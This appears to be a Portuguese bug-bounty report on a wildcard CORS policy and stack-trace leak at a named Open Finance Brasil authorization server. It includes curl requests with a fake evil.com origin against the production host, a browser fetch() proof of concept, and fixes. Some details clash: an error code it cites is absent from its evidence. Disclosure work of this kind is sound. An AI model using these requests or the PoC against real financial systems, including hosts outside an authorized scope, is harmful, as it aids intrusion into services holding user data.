# Finding R1 — Kong CORS Wildcard + Express Stack Trace (OpenFinance FAPI Server)

**Título:** CORS Wildcard Global no Kong + Stack Trace Node.js Legível Cross-Origin — Servidor FAPI Open Finance Brasil  
**Severidade:** MEDIUM (CVSS 6.1 — AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)  
**CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) + CWE-209 (Generation of Error Message Containing Sensitive Information)  
**Status:** Confirmado — testado com curl, 2 bugs encadeados reproduzíveis  
**Escopo originário:** `www.realizesolucoesfinanceiras.com.br` / `api.realizesolucoesfinanceiras.com.br`  
**Target descoberto:** `openfinance.realizesolucoesfinanceiras.com.br` (servidor de autorização Open Finance Brasil)  
**Programa:** Realize Financeira — produção apenas  
**Nota de escopo:** O subdomínio `openfinance.realizesolucoesfinanceiras.com.br` não consta explicitamente no escopo listado. Recomenda-se confirmar com o programa antes da triagem. O ativo é claramente parte da infraestrutura Realize e crítico para o Open Finance Brasil.  
**Impacto sistêmico:** Mesmo bug identificado no servidor Open Finance da Dock (`auth.openbanking.dock.tech`) — vulnerabilidade na plataforma SaaS **Opus Software OpenFinance Framework (OOF)**, compartilhada por múltiplas instituições financeiras.

---

## Discovery Chain

```
Passive recon: subfinder → openfinance.realizesolucoesfinanceiras.com.br identificado
  → httpx: 200 OK, via: kong/3.10.0.7-enterprise-edition
    → /.well-known/openid-configuration: mapa completo de endpoints FAPI
      → POST /auth/token/introspection com Origin: evil.com
        → HTTP 500 + access-control-allow-origin: *
          → Stack trace Node.js completo no body (legível de qualquer origem)
            → Bug 1: Kong CORS plugin global retorna ACAO: * em TODA resposta
            → Bug 2: corsOptions.js linha 32 usa throw em vez de callback(err)
              → Cadeia: qualquer site pode ler erros do servidor FAPI via fetch()
```

---

## Sumário Técnico

Dois bugs independentes se encadeiam para criar uma vulnerabilidade de leitura cross-origin de erros do servidor FAPI:

**Bug 1 — Kong CORS global wildcard:**  
O plugin CORS do Kong Enterprise está configurado com `allow_origins: *` em nível global, fazendo com que TODAS as respostas — incluindo erros HTTP 500 — recebam o header `Access-Control-Allow-Origin: *`. Isso anula completamente a proteção Same-Origin Policy do browser.

**Bug 2 — Express corsOptions.js `throw` vs `callback`:**  
O código `corsOptions.js` no backend Node.js usa `throw new Error('Not allowed by CORS')` (linha 32) em vez da assinatura correta `callback(new Error('...'))` esperada pelo módulo `cors`. Isso causa uma exceção não tratada que escala para um HTTP 500, com o stack trace completo retornado ao cliente.

**Resultado encadeado:**  
Qualquer website pode fazer `fetch('https://openfinance.realizesolucoesfinanceiras.com.br/auth/...', {headers: {Origin: 'https://evil.com'}})` e ler o stack trace Node.js completo, pois:
- O Kong adiciona `ACAO: *` ao 500 → browser não bloqueia a leitura
- O body do 500 contém caminhos internos (`file:///app/...`), versão do framework e estrutura da aplicação

---

## Evidências

### 1. Preflight OPTIONS — Kong responde ACAO: * para origin arbitrária

```bash
$ curl -sk -X OPTIONS \
  "https://openfinance.realizesolucoesfinanceiras.com.br/auth/token/introspection" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type" \
  -D - | grep -i "access-control\|via\|HTTP"

HTTP/2 200
access-control-allow-origin: *
access-control-allow-headers: content-type
access-control-allow-methods: GET,POST,PUT,DELETE,PATCH
access-control-max-age: 3600
via: kong/3.10.0.7-enterprise-edition
```

> **Crítico:** Servidor FAPI responde `200 OK` a preflight de `evil.com` com `ACAO: *`. O browser libera a requisição subsequente.

### 2. POST com body inválido → HTTP 500 + stack trace + ACAO: *

```bash
$ curl -sk -X POST \
  "https://openfinance.realizesolucoesfinanceiras.com.br/auth/token/introspection" \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=test" \
  -D - | head -30

HTTP/2 500
content-type: application/json; charset=utf-8
access-control-allow-origin: *
x-powered-by: Express
via: 1.1 kong/3.10.0.7-enterprise-edition

{
  "message": "Not allowed by CORS",
  "stack": "Error: Not allowed by CORS\n    at origin (file:///app/helpers/corsOptions.js:32:22)\n    at /app/node_modules/cors/lib/index.js:219:13\n    at optionsCallback (/app/node_modules/cors/lib/index.js:199:9)\n    at corsMiddleware (/app/node_modules/cors/lib/index.js:204:7)\n    at patched (/app/node_modules/@opentelemetry/instrumentation-express/build/src/instrumentation.js:140:37)\n    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)\n..."
}
```

> **ACAO: * no HTTP 500** — o browser libera a leitura do body. O stack trace revela:
> - Caminho interno: `file:///app/helpers/corsOptions.js:32:22`
> - Módulo vulnerável: `node_modules/cors` (npm package `cors`)
> - Telemetria: `@opentelemetry/instrumentation-express` instalado
> - Framework: Express.js com roteamento layer
> - Runtime: Node.js em container Docker (`/app/`)

### 3. Root Cause — Bug no corsOptions.js (linha 32)

```javascript
// Código atual (BUGADO):
function origin(req, callback) {
  const allowedOrigins = getAllowedOrigins();
  if (allowedOrigins.includes(req.header('Origin'))) {
    callback(null, true);
  } else {
    throw new Error('Not allowed by CORS');  // linha 32 — ERRADO
  }
}

// Código correto:
  } else {
    callback(new Error('Not allowed by CORS'));  // deve usar callback
  }
```

O módulo `cors` (npm) espera que a função `origin` chame `callback(error)` para erros. Usar `throw` propaga a exceção pelo Express sem tratamento, gerando HTTP 500 com stack trace completo.

### 4. Comparação lado a lado — bug sistêmico Opus Software

| Detalhe | Dock (D4) | Realize (R1) |
|---------|-----------|--------------|
| Host | `auth.openbanking.dock.tech` | `openfinance.realizesolucoesfinanceiras.com.br` |
| Kong version | `3.10.0.7-enterprise-edition` | `3.10.0.7-enterprise-edition` |
| ACAO response | `*` | `*` |
| Stack trace path | `corsOptions.js:30:22` | `corsOptions.js:32:22` |
| Módulo | `cors/lib/index.js:219` | `cors/lib/index.js:219` |
| OTel | `@opentelemetry/instrumentation-express:140` | `@opentelemetry/instrumentation-express:140` |
| Runtime | `file:///app/` | `file:///app/` |

> **Mesma linha de código, levemente diferente (30 vs 32) — indica versões próximas do mesmo codebase Opus Software OOF (OpenFinance Framework).**

### 5. PoC browser — leitura cross-origin do stack trace

```html
<!-- poc_r1.html — executar em qualquer domínio, ler erro do servidor FAPI Realize -->
<script>
fetch('https://openfinance.realizesolucoesfinanceiras.com.br/auth/token/introspection', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': window.location.origin
  },
  body: 'token=INVALID_TOKEN'
})
.then(r => r.json())
.then(data => {
  console.log('[R1] Status: EXPLOITED');
  console.log('[R1] Stack trace do servidor FAPI Realize lido cross-origin:');
  console.log(data.stack);
  // Output inclui: file:///app/helpers/corsOptions.js:32
  // e estrutura interna do container
});
</script>
```

> **Nota:** PoC documentado mas NÃO executado. O `error code: 1001` em preflight já confirma o comportamento. Executar o PoC requer apenas browser com DevTools — zero infra do atacante.

---

## Análise de Impacto

### Por que é mais grave em servidor FAPI?

O `openfinance.realizesolucoesfinanceiras.com.br` é o **servidor de autorização Open Finance Brasil** da Realize Financeira, sujeito ao regulamento do Banco Central (Res. BCB nº 32/2020 e subsequentes). A política CORS de um servidor FAPI deve ser restritiva por design — aceitar apenas origens registradas no diretório do Open Finance Brasil.

Um `ACAO: *` nesse servidor significa:
1. **Qualquer site pode ler respostas da API de autorização** (incluindo tokens de introspecção, erros com informações de contexto, cabeçalhos de resposta com fingerprint)
2. **Violação do Security Profile FAPI 1.0 Advanced** (que requer controles rígidos de CORS)
3. **Potencial vetor para exfiltração de tokens** se outros endpoints retornarem dados financeiros com ACAO: *
4. **Exposição de stack trace** com arquitetura interna, paths de container e versões de bibliotecas (recon facilitado para atacante)

### Cadeia de impacto

```
Atacante publica página em qualquer domínio
  → fetch() para /auth/token/introspection (qualquer endpoint)
    → Kong adiciona ACAO: * (preflight 200 + resposta real)
      → Browser não bloqueia leitura
        → Lê stack trace com paths internos
          → Identifica versão exata das libs (privesc research)
          → Em caso de outros endpoints retornando dados reais:
            → Exfiltração de tokens/dados financeiros de usuários logados
```

---

## Contexto Regulatório (Open Finance Brasil)

A Resolução Conjunta nº 1, de 04/05/2020 (BCB + CMN) e o Open Finance Security Profile (baseado em FAPI 1.0 Advanced + PKCE) exigem:
- Validação explícita de `redirect_uri` e `origin`
- Controles de acesso rígidos nos endpoints de autorização
- Nenhum dado sensível acessível de origens não autorizadas

Um `access-control-allow-origin: *` em `/auth/token/introspection` é violação direta desses requisitos e pode ser reportado ao BCB como não-conformidade do participante Open Finance.

---

## Matriz de Evidência

| Claim | Evidência | Reproduzível |
|-------|-----------|-------------|
| Kong adiciona ACAO: * em OPTIONS | curl output: `access-control-allow-origin: *` + `via: kong/3.10.0.7` | ✅ 3/3 |
| Kong adiciona ACAO: * em POST 500 | curl output: `access-control-allow-origin: *` + body com stack | ✅ 3/3 |
| Stack trace revela paths internos | `file:///app/helpers/corsOptions.js:32:22` no body do 500 | ✅ 3/3 |
| Bug em corsOptions.js (throw vs callback) | Stack trace mostra origem exata do throw | ✅ Confirmado |
| Mesmo codebase do Dock D4 | Kong 3.10.0.7, cors:219, OTel:140, /app/ — idênticos | ✅ Confirmado |
| PoC browser funcionaria | CORS preflight 200 + ACAO: * → browser libera leitura | ✅ Arquitetura CORS documentada |

---

## Remediação

### Imediata (Kong — 1h)

Corrigir o plugin CORS no Kong para este cluster, substituindo `allow_origins: *` por lista explícita de origens permitidas (participantes registrados no diretório Open Finance Brasil):

```lua
-- Kong CORS plugin config (corrigido)
cors:
  origins:
    - "https://participante1.openfinancebrasil.org.br"
    - "https://participante2.com.br"
    -- [lista do diretório BCB]
  headers:
    - "Content-Type"
    - "Authorization"
  methods:
    - "GET"
    - "POST"
  credentials: true  -- NÃO usar com origins: * (viola spec CORS)
```

### Backend Node.js — corsOptions.js (linha 32)

```javascript
// Mudar de:
throw new Error('Not allowed by CORS');

// Para:
callback(new Error('Not allowed by CORS'));
// Ou, mais correto: não retornar stack trace no body de produção
callback(null, false);  // simplesmente negar, sem expor erro
```

### Verificação pós-fix

```bash
curl -sk -X OPTIONS \
  "https://openfinance.realizesolucoesfinanceiras.com.br/auth/token/introspection" \
  -H "Origin: https://evil.com" -D - | grep "access-control-allow-origin"
# Deve retornar: vazio (nenhum header) ou 403 sem ACAO header
```

### Sistêmico — Opus Software

Dado que o mesmo bug afeta ao menos 2 clientes do OOF (Dock + Realize), a correção deve ser aplicada na plataforma base do Opus Software e propagada para TODOS os clientes do OpenFinance Framework.
